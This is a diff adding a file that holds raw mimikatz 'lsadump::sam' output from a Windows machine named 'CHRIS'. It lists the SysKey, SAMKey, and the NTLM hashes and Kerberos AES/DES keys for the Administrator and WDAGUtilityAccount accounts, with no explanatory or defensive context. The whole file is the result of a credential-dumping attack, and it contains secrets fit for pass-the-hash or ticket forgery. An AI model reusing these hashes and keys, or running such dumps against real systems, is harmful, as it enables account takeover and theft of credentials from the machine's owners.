@@ -1,0 +1,68 @@
+mimikatz # lsadump::sam
+Domain : CHRIS
+SysKey : d31c7e497ae6c6cb0aa763e614a2b769
+Local SID : S-1-5-21-2000997715-1635725215-2133440543
+
+SAMKey : 31db8bc4dc99aba2e69090ef70a0cc23
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: af636dea707fa9cf431562c90e8a4044
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : fdae7cf7843f1eff0272eba687d1e7ea
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : CHRISAdministrator
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 680a7503647c5dae0fe7faa595e5e9b2f1c3ea0c081e4e61f889087c716aa647
+      aes128_hmac       (4096) : 772573b705d4e034203cdd0541c85af5
+      des_cbc_md5       (4096) : ea6e739b2a732ffd
+    OldCredentials
+      aes256_hmac       (4096) : 45847f31653714365db111301f3057b80498e942945426000ddcbee5caf0f484
+      aes128_hmac       (4096) : a265f29d06e67e84ddd3826326ad9326
+      des_cbc_md5       (4096) : df326404ba671cf8
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : CHRISAdministrator
+    Credentials
+      des_cbc_md5       : ea6e739b2a732ffd
+    OldCredentials
+      des_cbc_md5       : df326404ba671cf8
+
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000001f7 (503)
+User : DefaultAccount
+
+RID  : 000001f8 (504)
+User : WDAGUtilityAccount
+  Hash NTLM: 029a314f0f6b04e07c1a58988b44b3c9
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 85e97dd95981763054c74ff7e3511e70
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : WDAGUtilityAccount
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : a4487c5f352f3a78a524470d3c665d3e7859a6707b1ffeb0ccd24c19c5b1d2d0
+      aes128_hmac       (4096) : 5a0c64c2fefa0678a9973f824965607e
+      des_cbc_md5       (4096) : 62400ddc7afb86f7
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : WDAGUtilityAccount
+    Credentials
+      des_cbc_md5       : 62400ddc7afb86f7
+
